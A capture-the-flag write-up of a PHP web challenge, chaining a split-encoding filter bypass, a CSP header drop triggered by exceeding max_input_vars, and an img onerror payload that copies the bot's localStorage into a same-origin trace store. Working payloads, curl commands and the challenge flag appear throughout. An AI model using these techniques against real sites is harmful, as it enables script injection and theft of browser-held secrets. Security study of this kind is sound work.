# Lumen — Web

**Event:** Black Hat MEA CTF Qualification 2026 (FlagYard)
**Category:** Web
**Flag:** `BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}`

> *Lumen is a read-only document relay with a content security policy locked down on every
> page, so the operator is confident that even a stray reflection cannot run. Sign in is not
> your problem. The operator is, and the operator keeps something valuable in their browser.
> Find the reflection, get it to run despite the policy, and convince the operator to hand it
> over.*

The brief tells you exactly what to do, in order: **find the reflection**, **get it to run
despite the CSP**, **exfiltrate what's in the operator's browser**. Each clause is a separate
sub-puzzle, and the interesting one is the middle: the CSP is genuinely airtight, so "getting it
to run" is not an XSS-filter problem at all — it's a PHP problem.

---

## The application

A single [`index.php`](artifacts/challenge/application/public/index.php) serves four pages via
`?p=` (`home`, `view`, `report`, `trace`). The valuable data never touches the server: a
Playwright bot ([`bot.js`](artifacts/challenge/application/bot.js)) seeds the flag into
`localStorage` and then opens whatever URL you report.

```js
await page.goto(SELF + '/?p=home', { waitUntil: 'load' });
await page.evaluate((f) => localStorage.setItem('flag', f), FLAG);   // <-- the target
...
await page.goto(target, { waitUntil: 'load' });
await page.waitForTimeout(4000);
```

`localStorage` is origin-scoped, so the flag is readable from **any** page on
`http://127.0.0.1:5000` — but only by JavaScript running on that origin. There is no server-side
reflection of the flag anywhere. **We must execute script on the origin.** That single fact
drives everything below and rules out every scriptless trick (dangling-markup, CSS exfiltration,
etc.): the secret simply isn't in any HTML response to steal.

Every response ships this header:

```
Content-Security-Policy: default-src 'none'; script-src 'nonce-<16 random bytes>';
                         style-src 'nonce-<same>'; img-src 'self'; base-uri 'none';
```

```php
$nonce = bin2hex(random_bytes(16));
header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce'; ...");
```

The page contains **no script of its own** — only a `<style nonce=…>` block in `<head>`.

---

## Step 1 — the reflection

`?p=view` looks up a document and, on a miss, reflects the requested path **without escaping**:

```php
function clean($s) {
  if (!is_string($s)) return false;
  if (preg_match('/%3c/i', $s)) return false;      // reject encoded '<'
  return htmlspecialchars($s, ENT_QUOTES);
}
...
$dir  = clean($_GET['dir']);
$file = clean($_GET['file']);
...
$path = urldecode($dir . $file);                   // <-- decode AFTER cleaning
$key  = preg_replace('#^docs/#', '', $path);
if (isset($DOCS[$key])) { ... }
else {
  echo '<div class="card"><p class="err">404 - no document at <b>'.$path.'</b>...';  // RAW
}
```

`$path` is echoed raw. The author's defence is `clean()`, and it has two layers:

* `htmlspecialchars(..., ENT_QUOTES)` neutralises `< > & " '`, and
* a hard reject on any parameter containing `%3c` (encoded `<`).

The reject exists because of the **order of operations**: `clean()` runs first, then `$path` is
`urldecode`-d *after*. So a percent-encoded `<` would sail through `htmlspecialchars` untouched
and only become a real `<` at the later `urldecode`. The author saw that and blocked `%3c`.

What they missed is that the check is **per-parameter** while the `urldecode` is on the
**concatenation** `$dir . $file`. Split the sequence across the boundary and neither parameter
ever contains `%3c`:

| | `$_GET` value (after PHP's decode) | passes `clean()`? | after `htmlspecialchars` |
|---|---|---|---|
| `dir`  | `docs/%3`      | yes (no `%3c`) | `docs/%3` |
| `file` | `c…payload…`   | yes (no `%3c`) | `c…payload…` |

Concatenate → `docs/%3c…payload…` → `urldecode` → `docs/<…payload…`. One real `<`, straight
past the filter:

```
$ curl -s '…/?p=view&dir=docs/%253&file=cb%2520onerror%253dalert(1)%253etest'
… 404 - no document at <b>docs/<b onerror=alert(1)>test</b> …
```

### The double-encoding, precisely

Two URL-decodes happen to our bytes — PHP's automatic decode of `$_GET`, and the explicit
`urldecode($dir.$file)` — with `htmlspecialchars` sandwiched between them. To place a literal
character `C` in the final output we therefore encode it **twice** on the wire, so it arrives at
`htmlspecialchars` as an inert `%XX` and is only turned back into `C` by the final `urldecode`.
That also sidesteps `htmlspecialchars` entirely for `" ' >` (they travel as `%22 %27 %3e`).

Working backwards, to inject the HTML string `P` after the smuggled `<`:

```
final $path      = "docs/<" + P
$_GET['dir']     = "docs/%3"                 wire:  dir  = docs%2F%253
$_GET['file']    = "c" + urlencode(P)        wire:  file = c + urlencode(urlencode(P))
```

The only constraint on `P` is that it must not itself contain a raw `<` (we get exactly one, at
the boundary). That is plenty — a single element with attributes is all an event handler needs.
The construction is in [`solve/gen.py`](solve/gen.py).

---

## Step 2 — getting it to run despite the CSP

We now have HTML injection, but the CSP is strict and correct:

* `script-src 'nonce-…'` — inline and external scripts need the nonce; there is **no**
  `'unsafe-inline'`, so event handlers and `javascript:` are dead too.
* the nonce is `bin2hex(random_bytes(16))`, **fresh on every response**, so it can't be guessed.
* it sits in `<head>`, i.e. **before** our reflection in `<body>`, so dangling-markup can't
  steal it forward either (and browsers hide `nonce` from the DOM/CSS anyway).
* `default-src 'none'` also kills `frame-src`/`object-src`, so no `<iframe srcdoc>` /
  `<object>` document to escape into.

Purely client-side, this CSP does what it claims. The weakness is one level down, in **how the
header is set**. Look at the runner:

```sh
exec php -d display_errors=1 -d output_buffering=0 -d max_input_vars=1000 \
     -d variables_order=GPCS -S 0.0.0.0:5000 -t /app/public
```

Four flags, and together they are the whole vulnerability:

* `max_input_vars=1000` — PHP caps the number of input variables it will register and **emits a
  warning** when a request exceeds it. Critically, this happens in the **request-startup /
  input-parsing phase**, before a single line of `index.php` executes.
* `display_errors=1` + `output_buffering=0` — that warning is written to the response body
  **immediately**, unbuffered.
* `header(...)` in `index.php` — runs *after* input parsing.

So if a request carries more than 1000 parameters, PHP prints the warning first, the HTTP
response body begins, headers are flushed — and then `index.php` reaches its very first line and
calls `header("Content-Security-Policy: …")` **too late**:

```
<br />
<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000. … in <b>Unknown</b> on line <b>0</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/app/public/index.php</b> on line <b>3</b><br />
<!doctype html> …
```

`Cannot modify header information - headers already sent`. **The CSP header is never sent.** The
response comes back with no CSP at all (see [`artifacts/csp-drop.txt`](artifacts/csp-drop.txt)).

So the delivery URL just needs >1000 GET parameters. Order matters slightly: PHP registers the
first 1000 in order before bailing, so we place `p`, `dir`, `file` first and pad with a thousand
throwaway `z1=1&z2=1&…` afterwards. Those only need to exist to trip the counter.

With the CSP gone, the one element from Step 1 becomes a plain, old-fashioned event-handler XSS:

```html
<img src=x onerror="new Image().src='/?p=trace&id=xk7qp2mn9wab&note='
                    +encodeURIComponent(JSON.stringify(localStorage))">
```

`src=x` 404s → `onerror` fires → the handler runs with no CSP to stop it.

---

## Step 3 — convincing the operator to hand it over

`onerror` reads the operator's `localStorage` and needs to get it back to us. Even though we
dropped the CSP on *our* page, the cleanest, most reliable exfiltration channel is one that
would have worked **even with the CSP intact**: the `trace` endpoint, which is a same-origin
read/write key–value store.

```php
elseif ($p === "trace"):
  $id = $_GET['id'];
  if (preg_match('/^[A-Za-z0-9]{8,64}$/', $id)) {
    $t = $TRACE_DIR . '/' . $id;
    if (isset($_GET['note'])) {                       // write
      file_put_contents($t, substr($_GET['note'], 0, 1024), LOCK_EX);
    } elseif (is_file($t)) {                           // read
      echo '…<pre>'.htmlspecialchars(file_get_contents($t)).'</pre>…';
    }
  }
```

A `GET /?p=trace&id=<8–64 alnum>&note=<data>` writes `<data>`; a later
`GET /?p=trace&id=<same>` reads it back. The `onerror` handler issues exactly that write via an
`Image()` — a same-origin GET, which would satisfy even `img-src 'self'`. We pick an id
(`xk7qp2mn9wab`), the operator's browser stores `{"flag":"…"}` there, and we read it back at our
leisure.

`JSON.stringify(localStorage)` grabs every key at once, so we don't have to assume the key name
in advance.

### Delivery

`?p=report` accepts any `http(s)` URL with no control characters and queues it; the bot
localises it to `http://127.0.0.1:5000` + path + query + hash, so our whole query string
survives verbatim. Submit the ~7 KB payload URL, wait for the poll-and-visit cycle, then read
the trace:

```
$ curl -s -X POST '…/?p=report' --data-urlencode "url=$(cat artifacts/payload_url.txt)"
… Queued …

$ curl -s '…/?p=trace&id=xk7qp2mn9wab' | grep -o '<pre>.*</pre>'
<pre>{&quot;flag&quot;:&quot;BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}&quot;}</pre>
```

```
BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}
```

Full transcript in [`artifacts/session.txt`](artifacts/session.txt).

---

## Reproducing

```bash
cd solve
python3 gen.py                       # print a payload URL (random trace id, 127.0.0.1 target)
python3 exploit.py http://<host>     # generate -> report -> poll trace -> print flag
```

Pure Python 3, standard library only. `exploit.py` runs the full chain end to end; `gen.py`
holds the encoding so you can inspect or reshape the injected element.

---

## Takeaways

**A CSP is only as trustworthy as the code path that emits it.** The policy here was flawless;
the bug was that `header()` can lose a race to unbuffered startup output. `display_errors=1`
with `output_buffering=0` turns *any* pre-execution notice — `max_input_vars`, a startup
deprecation, an `.htaccess`/`auto_prepend` hiccup — into a security-header bypass. Set security
headers you cannot afford to lose at the web-server layer, keep `display_errors` off in
production, and don't leave `output_buffering` at 0.

**Defence-in-depth cuts both ways.** The `trace` store was a convenience feature, but it doubles
as a same-origin exfiltration sink that survives even `img-src 'self'` — so dropping the CSP
wasn't strictly necessary for the *exfil*, only for the *execution*.

**Filter on the value you actually emit.** `clean()` inspected each parameter before the
`urldecode` and concatenation that produced the sink string, so its `%3c` check operated on the
wrong bytes. Canonicalise first (decode fully), then validate, then use — never validate a
different representation than the one you output.

---

## Layout

```
README.md          this writeup
writeup.html       the same writeup as a standalone page
solve/
  gen.py           payload builder: %3c boundary-split + double-encoding + >1000 params
  exploit.py       end-to-end driver: report -> poll trace -> flag
artifacts/
  payload_url.txt  the exact delivery URL (trace id xk7qp2mn9wab, 127.0.0.1 target)
  csp-drop.txt     captured headers showing the CSP header vanish under >1000 params
  session.txt      the winning session transcript
  challenge/       the challenge source as shipped (index.php, bot.js, Dockerfile, run, …)
```
